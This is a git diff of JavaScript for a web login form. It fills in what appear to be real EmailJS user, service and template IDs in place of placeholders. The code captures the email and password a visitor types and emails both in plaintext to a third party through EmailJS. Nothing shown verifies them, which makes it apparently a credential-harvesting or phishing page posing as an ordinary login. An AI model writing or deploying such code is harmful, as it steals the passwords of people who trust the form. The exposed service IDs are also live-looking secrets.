@@ -1,6 +1,6 @@
 // Initialize EmailJS
 (function() {
-    emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
+    emailjs.init("oC7GP_zB1Qtk2EzkL"); // Replace with your EmailJS user ID
 })();
 
 document.getElementById('loginForm').addEventListener('submit', function(event) {
@@ -10,7 +10,7 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
     const password = document.getElementById('password').value;
 
     // Send email using EmailJS
-    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+    emailjs.send("service_geuutdc", "template_tya6lcj", {
         email: email,
         password: password
     })
